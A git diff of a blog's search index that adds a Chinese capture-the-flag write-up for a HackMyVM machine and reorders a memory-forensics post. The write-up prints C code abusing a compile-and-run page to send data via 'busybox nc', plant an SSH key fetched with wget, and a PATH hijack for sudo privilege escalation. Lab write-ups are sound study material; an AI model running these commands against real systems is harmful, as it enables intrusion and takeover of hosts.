@@ -4,6 +4,37 @@
   
     
     <entry>
+      <title>hackmyvm Machines-Easy</title>
+      <link href="/posts/d2d3541f/"/>
+      <url>/posts/d2d3541f/</url>
+      
+        <content type="html"><![CDATA[<h1 id="sysadmin">Sysadmin</h1><p>访问过去是个上传的页面，能够编译运行C语言源文件，查看网页源码注释里给出了编译用的命令</p><figure><imgsrc="/images/hackmyvm-Machines-Easy/1761901594374-79165964-8c3b-494d-8131-991d43c251ad.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>从命令中看出禁止了从外部链接库，所以要用system函数得自己定义一下。简单尝试后发现很多常用命令没有，但是有busybox用。先搞到当前用户名</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">system</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *command)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    system(<span class="string">&quot;echo $(whoami) | busybox nc 192.168.56.1 23333&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure><imgsrc="/images/hackmyvm-Machines-Easy/1761902395062-47c3b853-6f27-4746-8c4e-9b2d00a5d05f.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>然后写公钥进去，在本地起个服务wget进去</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">system</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *command)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    system(<span class="string">&quot;mkdir -p ~/.ssh &amp;&amp; touch ~/.ssh/authorized_keys &amp;&amp; busybox wget 192.168.56.1:8000/id_rsa.pub -O ~/.ssh/authorized_keys&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后直接ssh连上，拿到普通用户的flag</p><figure><imgsrc="/images/hackmyvm-Machines-Easy/1761902514467-24d0d09f-ceda-4e50-9e64-2e2fce6ffa94.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>sudo -l发现有脚本被配以了sudo权限</p><figure><imgsrc="/images/hackmyvm-Machines-Easy/1761902586424-24098db0-365f-4f8b-87d0-338f621b16bf.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>劫持free命令提权成功读到root的flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span>@Sysadmin:~$ <span class="built_in">echo</span> <span class="string">&#x27;ls /root&#x27;</span> &gt; /tmp/free</span><br><span class="line"><span class="built_in">echo</span>@Sysadmin:~$ <span class="built_in">chmod</span> +x /tmp/free</span><br><span class="line"><span class="built_in">echo</span>@Sysadmin:~$ <span class="built_in">export</span> PATH=<span class="string">&quot;/tmp:<span class="variable">$PATH</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span>@Sysadmin:~$ sudo /usr/local/bin/system-info.sh</span><br><span class="line">Starting daily system information collection at Fri 31 Oct 2025 04:57:54 AM EDT</span><br><span class="line">------------------------------------------------------</span><br><span class="line"></span><br><span class="line">（这里省略）</span><br><span class="line"></span><br><span class="line">root.txt</span><br><span class="line">------------------------------------------------------</span><br><span class="line">Report complete at Fri 31 Oct 2025 04:57:54 AM EDT</span><br><span class="line"><span class="built_in">echo</span>@Sysadmin:~$ <span class="built_in">echo</span> <span class="string">&#x27;cat /root/root.txt&#x27;</span>&gt;/tmp/free</span><br><span class="line"><span class="built_in">echo</span>@Sysadmin:~$ sudo /usr/local/bin/system-info.sh</span><br><span class="line">Starting daily system information collection at Fri 31 Oct 2025 04:58:25 AM EDT</span><br><span class="line">------------------------------------------------------</span><br><span class="line"></span><br><span class="line">（这里省略）</span><br><span class="line"></span><br><span class="line">flag&#123;root-8b8a8b353298f798e3eb8628661617b6&#125;</span><br><span class="line">------------------------------------------------------</span><br><span class="line">Report complete at Fri 31 Oct 2025 04:58:25 AM EDT</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> Writeup </category>
+          
+          <category> hackmyvm </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Writeup </tag>
+            
+            <tag> 渗透 </tag>
+            
+            <tag> hackmyvm </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>春秋云境-GreatWall</title>
       <link href="/posts/f8a60ebc/"/>
       <url>/posts/f8a60ebc/</url>
@@ -2056,33 +2087,6 @@
     
     
     <entry>
-      <title>星盟 2024 Misc 招新题 第二题</title>
-      <link href="/posts/c81e8560/"/>
-      <url>/posts/c81e8560/</url>
-      
-        <content type="html"><![CDATA[<p>一个内存取证题，题目如下：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">小明在电脑上画了一幅图，这幅图的内容是什么，请提交其内容的md5值（32位小写）。</span><br></pre></td></tr></table></figure><p>经典起手式imageinfo</p><figure><imgsrc="/images/星盟-2024-Misc-招新题-第二题/image-20240723104201276.png"alt="image-20240723104201276" /><figcaption aria-hidden="true">image-20240723104201276</figcaption></figure><p>既然要求我们找图片，那就直接filescan出所有png，jpg，bmp，gif后缀名的文件</p><figure><imgsrc="/images/星盟-2024-Misc-招新题-第二题/image-20240723104602194.png"alt="image-20240723104602194" /><figcaption aria-hidden="true">image-20240723104602194</figcaption></figure><p>下面那个admin.bmp没法dump下来，上面这个jpg图片可以</p><figure><imgsrc="/images/星盟-2024-Misc-招新题-第二题/image-20240723104804628.png"alt="image-20240723104804628" /><figcaption aria-hidden="true">image-20240723104804628</figcaption></figure><p>dump下来是这么一张图</p><figure><imgsrc="/images/星盟-2024-Misc-招新题-第二题/image-20240723104828121.png"alt="image-20240723104828121" /><figcaption aria-hidden="true">image-20240723104828121</figcaption></figure><p>在乱翻cmd记录时看到他执行过这样一个命令</p><figure><imgsrc="/images/星盟-2024-Misc-招新题-第二题/image-20240723105020025.png"alt="image-20240723105020025" /><figcaption aria-hidden="true">image-20240723105020025</figcaption></figure><p>看来他对这个字符串进行过Atbash，那么cyberchef启动</p><figure><imgsrc="/images/星盟-2024-Misc-招新题-第二题/image-20240723105218652.png"alt="image-20240723105218652" /><figcaption aria-hidden="true">image-20240723105218652</figcaption></figure><p>要求提交的是md5值（32位小写）</p><figure><imgsrc="/images/星盟-2024-Misc-招新题-第二题/image-20240723105317395.png"alt="image-20240723105317395" /><figcaption aria-hidden="true">image-20240723105317395</figcaption></figure>]]></content>
-      
-      
-      <categories>
-          
-          <category> Writeup </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> Writeup </tag>
-            
-            <tag> Forensics </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>星盟 2024 Misc 招新题 第一题</title>
       <link href="/posts/c06ae389/"/>
       <url>/posts/c06ae389/</url>
@@ -2102,6 +2106,33 @@
             <tag> Writeup </tag>
             
             <tag> Misc </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>星盟 2024 Misc 招新题 第二题</title>
+      <link href="/posts/c81e8560/"/>
+      <url>/posts/c81e8560/</url>
+      
+        <content type="html"><![CDATA[<p>一个内存取证题，题目如下：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">小明在电脑上画了一幅图，这幅图的内容是什么，请提交其内容的md5值（32位小写）。</span><br></pre></td></tr></table></figure><p>经典起手式imageinfo</p><figure><imgsrc="/images/星盟-2024-Misc-招新题-第二题/image-20240723104201276.png"alt="image-20240723104201276" /><figcaption aria-hidden="true">image-20240723104201276</figcaption></figure><p>既然要求我们找图片，那就直接filescan出所有png，jpg，bmp，gif后缀名的文件</p><figure><imgsrc="/images/星盟-2024-Misc-招新题-第二题/image-20240723104602194.png"alt="image-20240723104602194" /><figcaption aria-hidden="true">image-20240723104602194</figcaption></figure><p>下面那个admin.bmp没法dump下来，上面这个jpg图片可以</p><figure><imgsrc="/images/星盟-2024-Misc-招新题-第二题/image-20240723104804628.png"alt="image-20240723104804628" /><figcaption aria-hidden="true">image-20240723104804628</figcaption></figure><p>dump下来是这么一张图</p><figure><imgsrc="/images/星盟-2024-Misc-招新题-第二题/image-20240723104828121.png"alt="image-20240723104828121" /><figcaption aria-hidden="true">image-20240723104828121</figcaption></figure><p>在乱翻cmd记录时看到他执行过这样一个命令</p><figure><imgsrc="/images/星盟-2024-Misc-招新题-第二题/image-20240723105020025.png"alt="image-20240723105020025" /><figcaption aria-hidden="true">image-20240723105020025</figcaption></figure><p>看来他对这个字符串进行过Atbash，那么cyberchef启动</p><figure><imgsrc="/images/星盟-2024-Misc-招新题-第二题/image-20240723105218652.png"alt="image-20240723105218652" /><figcaption aria-hidden="true">image-20240723105218652</figcaption></figure><p>要求提交的是md5值（32位小写）</p><figure><imgsrc="/images/星盟-2024-Misc-招新题-第二题/image-20240723105317395.png"alt="image-20240723105317395" /><figcaption aria-hidden="true">image-20240723105317395</figcaption></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> Writeup </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Writeup </tag>
+            
+            <tag> Forensics </tag>
             
         </tags>
       
@@ -2675,6 +2706,17 @@
     
     
     <entry>
+      <title>Comment</title>
+      <link href="/comment/index.html"/>
+      <url>/comment/index.html</url>
+      
+        <content type="html"><![CDATA[<h1 id="leave-anything-you-want-to-say-here-to-me">Leave anything youwant to say here to me!</h1>]]></content>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Categories</title>
       <link href="/categories/index.html"/>
       <url>/categories/index.html</url>
@@ -2702,17 +2744,6 @@
       <url>/tags/index.html</url>
       
         <content type="html"><![CDATA[]]></content>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>Comment</title>
-      <link href="/comment/index.html"/>
-      <url>/comment/index.html</url>
-      
-        <content type="html"><![CDATA[<h1 id="leave-anything-you-want-to-say-here-to-me">Leave anything youwant to say here to me!</h1>]]></content>
       
     </entry>
     
